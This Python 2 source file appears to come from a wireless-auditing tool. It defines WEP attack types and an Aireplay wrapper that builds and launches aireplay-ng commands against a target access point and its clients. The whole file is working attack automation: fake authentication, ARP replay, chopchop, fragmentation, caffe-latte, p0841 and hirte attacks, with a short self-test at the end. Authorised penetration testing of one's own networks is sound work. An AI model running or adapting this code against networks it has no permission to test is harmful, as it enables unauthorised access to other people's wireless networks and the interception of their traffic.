#!/usr/bin/python

from Configuration import Configuration
from Process import Process

class WEPAttackType(object):
    ''' Enumeration of different WEP attack types '''
    fakeauth   = 0
    replay     = 1
    chopchop   = 2
    fragment   = 3
    caffelatte = 4
    p0841      = 5
    hirte      = 6

    def __init__(self, var):
        '''
            Sets appropriate attack name/value given an input.
            Args:
                var - Can be a string, number, or WEPAttackType object
                      This object's name & value is set depending on var.
        '''
        self.value = None
        self.name = None
        if type(var) == int:
            for (name,value) in WEPAttackType.__dict__.iteritems():
                if type(value) == int:
                    if value == var:
                        self.name = name
                        self.value = value
                        return
            raise Exception("Attack number %d not found" % var)
        elif type(var) == str:
            for (name,value) in WEPAttackType.__dict__.iteritems():
                if type(value) == int:
                    if name == var:
                        self.name = name
                        self.value = value
                        return
            raise Exception("Attack name %s not found" % var)
        elif type(var) == WEPAttackType:
            self.name = var.name
            self.value = var.value
        else:
            raise Exception("Attack type not supported")

    def __str__(self):
        return self.name


class Aireplay(object):
    def __init__(self, target, attack_type):
        '''
            Starts aireplay process.
            Args:
                target - Instance of Target object, AP to attack.
                attack_type - int, str, or WEPAttackType instance.
        '''
        cmd = Aireplay.get_aireplay_command(target, attack_type)
        self.pid = Process(cmd, devnull=False)

    def is_running(self):
        return self.pid.poll() == None

    def stop(self):
        ''' Stops aireplay process '''
        if self.pid and self.pid.poll() != None:
            self.pid.interrupt()

    def get_output(self):
        ''' Returns stdout from aireplay process '''
        return self.pid.stdout()

    @staticmethod
    def get_aireplay_command(target, attack_type):
        '''
            Generates aireplay command based on target and attack type
            Args:
                target - Instance of Target object, AP to attack.
                attack_type - int, str, or WEPAttackType instance.
        '''

        # Interface is required at this point
        Configuration.initialize()
        if Configuration.interface == None:
            raise Exception("Wireless interface must be defined (-i)")
            
        cmd = ['aireplay-ng']
        cmd.append('--ignore-negative-one')
        client_mac = None
        if len(target.clients) > 0:
            client_mac = target.clients[0].station

        # type(attack_type) might be str, int, or WEPAttackType.
        # Find the appropriate attack enum.
        attack_type = WEPAttackType(attack_type).value

        if attack_type == WEPAttackType.fakeauth:
            cmd.extend(['-1', '0']) # Fake auth, no delay
            cmd.extend(['-a', target.bssid])
            cmd.extend(['-T', '1']) # Make 1 attemp
            if target.essid_known:
                cmd.extend(['-e', target.essid])

            # TODO Should we specify the source MAC as a client station?
            #if client_mac:
            #    cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.replay:
            cmd.append('--arpreplay')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.chopchop:
            cmd.append('--chopchop')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-m', '60']) # Minimum packet length (bytes)
            cmd.extend(['-n', '82']) # Maximum packet length
            cmd.extend(['-F'])       # Automatically choose first packet
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.fragment:
            cmd.append('--fragment')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-m', '100']) # Minimum packet length (bytes)
            cmd.extend(['-F'])       # Automatically choose first packet
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.caffelatte:
            cmd.append('--caffe-latte')
            cmd.extend(['-b', target.bssid])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.p0841:
            cmd.append('--interactive')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-c', 'ff:ff:ff:ff:ff:ff'])
            cmd.extend(['-t', '1'])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-F']) # Automatically choose first packet
            cmd.extend(['-p', '0841'])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.hirte:
            if client_mac == None:
                # Unable to carry out hirte attack
                raise Exception("Client is required for hirte attack")
            cmd.append('--cfrag')
            cmd.extend(['-h', client_mac])
        else:
            raise Exception("Unexpected attack type: %s" % attack_type)

        cmd.append(Configuration.interface)
        return cmd


if __name__ == '__main__':
    t = WEPAttackType(4)
    print t.name, type(t.name), t.value

    t = WEPAttackType('caffelatte')
    print t.name, type(t.name), t.value

    t = WEPAttackType(t)
    print t.name, type(t.name), t.value

    from Target import Target
    fields = 'AA:BB:CC:DD:EE:FF, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  1,  54, WPA2, CCMP TKIP,PSK, -58,        2,        0,   0.  0.  0.  0,   9, HOME-ABCD, '.split(',')
    t = Target(fields)

    cmd = Aireplay.get_aireplay_command(t, 'fakeauth')
    print ' '.join(['"%s"' % a for a in cmd])

